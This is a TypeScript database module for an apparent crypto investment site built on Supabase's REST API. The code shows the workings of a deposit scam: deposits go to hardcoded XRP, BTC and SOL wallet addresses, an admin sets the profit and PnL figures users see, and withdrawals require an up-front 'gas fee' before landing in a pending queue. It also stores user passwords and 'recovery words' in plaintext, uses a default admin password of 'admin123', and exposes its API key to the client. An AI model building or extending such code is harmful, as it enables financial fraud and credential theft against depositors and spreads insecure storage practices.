/**
 * Database backed by Supabase (Postgres).
 *
 * We talk to Supabase's auto-generated REST API (PostgREST) directly with
 * `fetch`, so there's no extra npm dependency. State lives in real tables:
 *   - app_settings  (one row: admin password, deposit wallets, gas fee, …)
 *   - connections   (one row per connected wallet / user)
 *   - deposits
 *   - withdrawals
 *
 * The public function signatures are unchanged from the old JSON version, so
 * the rest of the app doesn't need to know where the data lives.
 *
 * Config comes from Vite env vars (see .env.example):
 *   VITE_SUPABASE_URL  — https://<project>.supabase.co
 *   VITE_SUPABASE_KEY  — the project API key
 */

const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL as string | undefined
const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_KEY as string | undefined
const REST = SUPABASE_URL ? `${SUPABASE_URL.replace(/\/$/, '')}/rest/v1` : ''

export type DepositAsset = 'XRP' | 'BTC' | 'SOL'

/** One connected wallet = one user. Per-user stats live here too. */
export type DbConnection = {
  id: string
  walletId: string
  chain: 'evm' | 'solana'
  address: string
  /** Chosen on first sign-in. */
  username?: string
  /** Total the user has deposited, in USD. */
  deposited?: number
  /** Profit shown on the user's dashboard — admin sets this. */
  profit?: number
  /** PnL shown on the user's dashboard — admin sets this. */
  pnl?: number
  /** Email the user sets on first sign-up. Shown to admin. */
  email?: string
  /** Account password set on first sign-up. Stored, but NEVER shown to the admin. */
  password?: string
  /** ISO timestamp of when the email/password were submitted. */
  credentialsAt?: string
  /** User-chosen recovery words (5 or 10) the admin can use to confirm them. */
  recoveryWords?: string[]
  /** ISO timestamp of when the recovery words were set. */
  recoveryWordsAt?: string
  at: string // ISO timestamp of last connect
}

/** A deposit the user says they've made (manual transfer to a deposit address). */
export type DbDeposit = {
  id: string
  address: string // the user's connected wallet
  username?: string
  walletId: string
  asset: DepositAsset
  amountUsd: number
  at: string
}

/** A withdrawal request. The user pays a gas fee first, then we log the request. */
export type DbWithdrawal = {
  id: string
  address: string
  username?: string
  walletId: string
  amountUsd: number
  /** Gas fee the user paid to submit the request. */
  gasUsd: number
  /** How the gas fee was paid: an EVM tx hash, or a coin if paid manually. */
  gasTxHash?: string
  gasAsset?: DepositAsset
  status: 'pending' | 'paid' | 'rejected'
  at: string
}

export type Db = {
  /** Admin password override. Empty = fall back to the default 'admin123'. */
  adminPassword: string
  /** Deposit addresses (also the manual fallback for the withdrawal gas fee). */
  depositWalletXrp: string
  depositWalletBtc: string
  depositWalletSol: string
  /** EVM wallet that receives the in-app approved withdrawal gas fee. */
  gasFeeWalletEvm: string
  /** ETH price used to convert the USD gas fee into a wallet transaction. */
  ethPriceUsd: number
  /** Gas fee a user must pay to submit a withdrawal request, in USD. */
  gasFeeUsd: number
  connections: DbConnection[]
  deposits: DbDeposit[]
  withdrawals: DbWithdrawal[]
}

/** The deposit addresses the user gave us, used as defaults. */
export const DEFAULT_DB: Db = {
  adminPassword: '',
  depositWalletXrp: 'rJuZ88G5Urddbm1ZZKfsojXLv8omCZ3ruZ',
  depositWalletBtc: 'bc1qrw5yzwwtuc4lfnxm53uuefmlq52cgee04e4lkf',
  depositWalletSol: '9gLTbuPfFqUfAJjHLnCKdP9vK28LuL6Xw28Z6UV6oqdy',
  gasFeeWalletEvm: '',
  ethPriceUsd: 2500,
  gasFeeUsd: 5,
  connections: [],
  deposits: [],
  withdrawals: [],
}

export function isDbConfigured(): boolean {
  return Boolean(SUPABASE_URL && SUPABASE_KEY)
}

function assertConfig() {
  if (!isDbConfigured()) {
    throw new Error(
      'Database not configured. Set VITE_SUPABASE_URL and VITE_SUPABASE_KEY in your .env file.',
    )
  }
}

const now = () => new Date().toISOString()

/* ------------------------------------------------------------------ *
 * Low-level Supabase REST helper                                     *
 * ------------------------------------------------------------------ */

type SbInit = RequestInit & { prefer?: string }

async function sb(path: string, init: SbInit = {}): Promise<Response> {
  assertConfig()
  const { prefer, headers, ...rest } = init
  const res = await fetch(`${REST}/${path}`, {
    ...rest,
    headers: {
      apikey: SUPABASE_KEY!,
      Authorization: `Bearer ${SUPABASE_KEY!}`,
      'Content-Type': 'application/json',
      ...(prefer ? { Prefer: prefer } : {}),
      ...headers,
    },
  })
  if (!res.ok) {
    const body = await res.text().catch(() => '')
    throw new Error(`Supabase ${rest.method ?? 'GET'} ${path} failed (${res.status}) ${body}`)
  }
  return res
}

const sbGet = async <T>(path: string): Promise<T> => (await sb(path)).json()

/** Insert a row and return it. */
async function sbInsert<T>(table: string, row: unknown): Promise<T> {
  const res = await sb(table, {
    method: 'POST',
    prefer: 'return=representation',
    body: JSON.stringify(row),
  })
  const [created] = (await res.json()) as T[]
  return created
}

/** Patch rows matching `query` (a PostgREST filter, e.g. `id=eq.123`). */
async function sbPatch(table: string, query: string, patch: unknown): Promise<void> {
  await sb(`${table}?${query}`, {
    method: 'PATCH',
    prefer: 'return=minimal',
    body: JSON.stringify(patch),
  })
}

async function sbDelete(table: string, query: string): Promise<void> {
  await sb(`${table}?${query}`, { method: 'DELETE', prefer: 'return=minimal' })
}

/** PostgREST value-encode: `ilike.<addr>` gives case-insensitive exact match. */
const eqAddr = (address: string) => `address=ilike.${encodeURIComponent(address)}`

/* ------------------------------------------------------------------ *
 * Row <-> app-object mappers                                         *
 * ------------------------------------------------------------------ */

type ConnRow = {
  id: string
  wallet_id: string
  chain: 'evm' | 'solana'
  address: string
  username: string | null
  deposited: number | null
  profit: number | null
  pnl: number | null
  email: string | null
  password: string | null
  credentials_at: string | null
  recovery_words: string[] | null
  recovery_words_at: string | null
  at: string
}

const toConn = (r: ConnRow): DbConnection => ({
  id: r.id,
  walletId: r.wallet_id,
  chain: r.chain,
  address: r.address,
  username: r.username ?? undefined,
  deposited: r.deposited ?? 0,
  profit: r.profit ?? 0,
  pnl: r.pnl ?? 0,
  email: r.email ?? undefined,
  password: r.password ?? undefined,
  credentialsAt: r.credentials_at ?? undefined,
  recoveryWords: r.recovery_words ?? undefined,
  recoveryWordsAt: r.recovery_words_at ?? undefined,
  at: r.at,
})

type DepositRow = {
  id: string
  address: string
  username: string | null
  wallet_id: string
  asset: DepositAsset
  amount_usd: number
  at: string
}

const toDeposit = (r: DepositRow): DbDeposit => ({
  id: r.id,
  address: r.address,
  username: r.username ?? undefined,
  walletId: r.wallet_id,
  asset: r.asset,
  amountUsd: r.amount_usd,
  at: r.at,
})

type WithdrawalRow = {
  id: string
  address: string
  username: string | null
  wallet_id: string
  amount_usd: number
  gas_usd: number
  gas_tx_hash: string | null
  gas_asset: DepositAsset | null
  status: 'pending' | 'paid' | 'rejected'
  at: string
}

const toWithdrawal = (r: WithdrawalRow): DbWithdrawal => ({
  id: r.id,
  address: r.address,
  username: r.username ?? undefined,
  walletId: r.wallet_id,
  amountUsd: r.amount_usd,
  gasUsd: r.gas_usd,
  gasTxHash: r.gas_tx_hash ?? undefined,
  gasAsset: r.gas_asset ?? undefined,
  status: r.status,
  at: r.at,
})

type SettingsRow = {
  id: number
  admin_password: string | null
  deposit_wallet_xrp: string | null
  deposit_wallet_btc: string | null
  deposit_wallet_sol: string | null
  gas_fee_wallet_evm: string | null
  eth_price_usd: number | null
  gas_fee_usd: number | null
}

/* ------------------------------------------------------------------ *
 * Settings (single row, id = 1)                                      *
 * ------------------------------------------------------------------ */

async function getSettings(): Promise<SettingsRow | null> {
  const rows = await sbGet<SettingsRow[]>('app_settings?id=eq.1&limit=1')
  return rows[0] ?? null
}

/** Read+merge the single settings row on top of the defaults. */
async function readSettings(): Promise<Pick<
  Db,
  | 'adminPassword'
  | 'depositWalletXrp'
  | 'depositWalletBtc'
  | 'depositWalletSol'
  | 'gasFeeWalletEvm'
  | 'ethPriceUsd'
  | 'gasFeeUsd'
>> {
  const s = await getSettings()
  return {
    adminPassword: s?.admin_password ?? DEFAULT_DB.adminPassword,
    depositWalletXrp: s?.deposit_wallet_xrp ?? DEFAULT_DB.depositWalletXrp,
    depositWalletBtc: s?.deposit_wallet_btc ?? DEFAULT_DB.depositWalletBtc,
    depositWalletSol: s?.deposit_wallet_sol ?? DEFAULT_DB.depositWalletSol,
    gasFeeWalletEvm: s?.gas_fee_wallet_evm ?? DEFAULT_DB.gasFeeWalletEvm,
    ethPriceUsd: s?.eth_price_usd ?? DEFAULT_DB.ethPriceUsd,
    gasFeeUsd: s?.gas_fee_usd ?? DEFAULT_DB.gasFeeUsd,
  }
}

/** Upsert the single settings row (id = 1) with a partial patch. */
async function patchSettings(patch: Record<string, unknown>): Promise<void> {
  await sb('app_settings', {
    method: 'POST',
    prefer: 'return=minimal,resolution=merge-duplicates',
    body: JSON.stringify({ id: 1, ...patch }),
  })
}

/* ------------------------------------------------------------------ *
 * Aggregate read (kept for the admin dashboard)                      *
 * ------------------------------------------------------------------ */

/** Read everything at once, shaped like the old JSON document. */
export async function getDb(): Promise<Db> {
  const [settings, conns, deposits, withdrawals] = await Promise.all([
    readSettings(),
    sbGet<ConnRow[]>('connections?select=*&order=at.desc'),
    sbGet<DepositRow[]>('deposits?select=*&order=at.desc'),
    sbGet<WithdrawalRow[]>('withdrawals?select=*&order=at.desc'),
  ])
  return {
    ...settings,
    connections: conns.map(toConn),
    deposits: deposits.map(toDeposit),
    withdrawals: withdrawals.map(toWithdrawal),
  }
}

/* ------------------------------------------------------------------ *
 * Connections / users                                                *
 * ------------------------------------------------------------------ */

async function findConnRow(address: string): Promise<ConnRow | null> {
  const rows = await sbGet<ConnRow[]>(`connections?select=*&${eqAddr(address)}&limit=1`)
  return rows[0] ?? null
}

/** Record (or refresh) a connected wallet. Deduped by address. */
export async function recordConnection(c: Omit<DbConnection, 'id' | 'at'>) {
  const existing = await findConnRow(c.address)
  const at = now()
  if (existing) {
    await sbPatch('connections', `id=eq.${existing.id}`, {
      at,
      wallet_id: c.walletId,
      chain: c.chain,
    })
  } else {
    await sbInsert('connections', {
      address: c.address,
      wallet_id: c.walletId,
      chain: c.chain,
      username: c.username ?? null,
      deposited: 0,
      profit: 0,
      pnl: 0,
      at,
    })
  }
}

/** Look up a single user by their wallet address. */
export async function getUser(address: string): Promise<DbConnection | null> {
  const row = await findConnRow(address)
  return row ? toConn(row) : null
}

/** Set a user's username (chosen on first sign-in). Upserts the connection. */
export async function setUsername(
  address: string,
  username: string,
  meta?: { walletId: string; chain: 'evm' | 'solana' },
) {
  const existing = await findConnRow(address)
  if (existing) {
    await sbPatch('connections', `id=eq.${existing.id}`, { username })
  } else {
    await sbInsert('connections', {
      address,
      username,
      wallet_id: meta?.walletId ?? 'unknown',
      chain: meta?.chain ?? 'evm',
      deposited: 0,
      profit: 0,
      pnl: 0,
      at: now(),
    })
  }
}

/** Save the user's sign-up email (one-time). Upserts the connection. */
export async function setUserEmail(address: string, email: string) {
  const existing = await findConnRow(address)
  const at = now()
  if (existing) {
    await sbPatch('connections', `id=eq.${existing.id}`, { email, credentials_at: at })
  } else {
    await sbInsert('connections', {
      address,
      email,
      credentials_at: at,
      wallet_id: 'unknown',
      chain: 'evm',
      deposited: 0,
      profit: 0,
      pnl: 0,
      at,
    })
  }
}

/** Save the user's sign-up password (one-time). Never shown to the admin. */
export async function setUserPassword(address: string, password: string) {
  const existing = await findConnRow(address)
  const at = now()
  if (existing) {
    await sbPatch('connections', `id=eq.${existing.id}`, { password, credentials_at: at })
  } else {
    await sbInsert('connections', {
      address,
      password,
      credentials_at: at,
      wallet_id: 'unknown',
      chain: 'evm',
      deposited: 0,
      profit: 0,
      pnl: 0,
      at,
    })
  }
}

/** Save the user's recovery words (one-time). Upserts the connection. */
export async function setUserRecoveryWords(address: string, words: string[]) {
  const existing = await findConnRow(address)
  const at = now()
  if (existing) {
    await sbPatch('connections', `id=eq.${existing.id}`, {
      recovery_words: words,
      recovery_words_at: at,
    })
  } else {
    await sbInsert('connections', {
      address,
      recovery_words: words,
      recovery_words_at: at,
      wallet_id: 'unknown',
      chain: 'evm',
      deposited: 0,
      profit: 0,
      pnl: 0,
      at,
    })
  }
}

/** Record a deposit and add its amount to the user's running total. */
export async function recordDeposit(p: {
  address: string
  walletId: string
  asset: DepositAsset
  amountUsd: number
}) {
  const user = await findConnRow(p.address)
  if (user) {
    await sbPatch('connections', `id=eq.${user.id}`, {
      deposited: (user.deposited ?? 0) + p.amountUsd,
    })
  }
  await sbInsert('deposits', {
    address: p.address,
    wallet_id: p.walletId,
    asset: p.asset,
    amount_usd: p.amountUsd,
    username: user?.username ?? null,
    at: now(),
  })
}

/**
 * Log a withdrawal request. The user pays a gas fee first; the request is left
 * 'pending' for the admin to process. Enforces that the amount doesn't exceed
 * the user's current profit.
 */
export async function recordWithdrawal(p: {
  address: string
  walletId: string
  amountUsd: number
  gasUsd: number
  gasTxHash?: string
  gasAsset?: DepositAsset
}) {
  const user = await findConnRow(p.address)
  const profit = user?.profit ?? 0
  if (p.amountUsd > profit) {
    throw new Error(`You can withdraw at most your profit ($${profit}).`)
  }
  await sbInsert('withdrawals', {
    address: p.address,
    wallet_id: p.walletId,
    amount_usd: p.amountUsd,
    gas_usd: p.gasUsd,
    gas_tx_hash: p.gasTxHash ?? null,
    gas_asset: p.gasAsset ?? null,
    username: user?.username ?? null,
    status: 'pending',
    at: now(),
  })
}

/** A user's own withdrawal requests, newest first. */
export async function getUserWithdrawals(address: string): Promise<DbWithdrawal[]> {
  const rows = await sbGet<WithdrawalRow[]>(
    `withdrawals?select=*&${eqAddr(address)}&order=at.desc`,
  )
  return rows.map(toWithdrawal)
}

/** Admin: approve a pending withdrawal (marks it paid). */
export async function approveWithdrawal(id: string) {
  await sbPatch('withdrawals', `id=eq.${id}`, { status: 'paid' })
}

/** Admin: delete a withdrawal request. */
export async function deleteWithdrawal(id: string) {
  await sbDelete('withdrawals', `id=eq.${id}`)
}

/** Admin: delete a deposit record. */
export async function deleteDeposit(id: string) {
  await sbDelete('deposits', `id=eq.${id}`)
}

/** Admin: delete a user/connection record. */
export async function deleteConnection(id: string) {
  await sbDelete('connections', `id=eq.${id}`)
}

/** The effective admin password: the stored override, or the default. */
export async function getAdminPassword(): Promise<string> {
  const s = await readSettings()
  return s.adminPassword?.trim() || 'admin123'
}

/** Admin: set a new password (overrides the default 'admin123'). */
export async function setAdminPassword(password: string) {
  await patchSettings({ admin_password: password })
}

/** Admin: update the deposit addresses and gas fee. */
export async function updateDepositSettings(
  patch: Partial<
    Pick<
      Db,
      | 'depositWalletXrp'
      | 'depositWalletBtc'
      | 'depositWalletSol'
      | 'gasFeeWalletEvm'
      | 'ethPriceUsd'
      | 'gasFeeUsd'
    >
  >,
) {
  const map: Record<string, string> = {
    depositWalletXrp: 'deposit_wallet_xrp',
    depositWalletBtc: 'deposit_wallet_btc',
    depositWalletSol: 'deposit_wallet_sol',
    gasFeeWalletEvm: 'gas_fee_wallet_evm',
    ethPriceUsd: 'eth_price_usd',
    gasFeeUsd: 'gas_fee_usd',
  }
  const row: Record<string, unknown> = {}
  for (const [k, v] of Object.entries(patch)) {
    if (v !== undefined) row[map[k]] = v
  }
  if (Object.keys(row).length) await patchSettings(row)
}

/** Admin: manually set a user's deposited / profit / pnl figures. */
export async function updateUserStats(
  address: string,
  patch: Partial<Pick<DbConnection, 'deposited' | 'profit' | 'pnl'>>,
) {
  const user = await findConnRow(address)
  if (!user) throw new Error('User not found.')
  const row: Record<string, unknown> = {}
  if (patch.deposited !== undefined) row.deposited = patch.deposited
  if (patch.profit !== undefined) row.profit = patch.profit
  if (patch.pnl !== undefined) row.pnl = patch.pnl
  if (Object.keys(row).length) await sbPatch('connections', `id=eq.${user.id}`, row)
}
